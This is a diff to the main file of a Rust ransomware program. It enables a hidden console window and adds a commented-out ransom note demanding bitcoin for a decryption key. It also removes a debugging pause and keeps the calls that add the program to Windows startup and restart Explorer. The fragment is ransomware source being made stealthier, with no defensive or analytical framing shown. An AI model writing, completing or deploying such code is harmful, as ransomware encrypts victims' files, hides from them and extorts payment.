@@ -1,4 +1,4 @@
-//#![windows_subsystem = "windows"] // hides execution console
+#![windows_subsystem = "windows"] // hides execution console
 mod encryption;
 mod smart_dir;
 mod system_changer;
@@ -50,6 +50,12 @@ fn main() {
     }
 
     println!("Finished program execution!");*/
+    /*
+    fs::write(
+        "C:\\Users\\Administrator\\Desktop\\OpenMeInNotepad.rustsw",
+        "In order to receive decryption key and instructions send bitcoin here: XXdfsfAHJflh39",
+    );*/
+
     // Adds program to startup
     registry_changer::start_ransomware_on_startup();
 
@@ -128,8 +134,8 @@ fn main() {
     restart_explorer();
 
     // HACK keeping window opened for debugging purposes.
-    let mut buf = String::new();
-    std::io::stdin().read_line(&mut buf);
+    // let mut buf = String::new();
+    // std::io::stdin().read_line(&mut buf);
     /*
     for path in common_folder_paths {
         println!("{}", path);
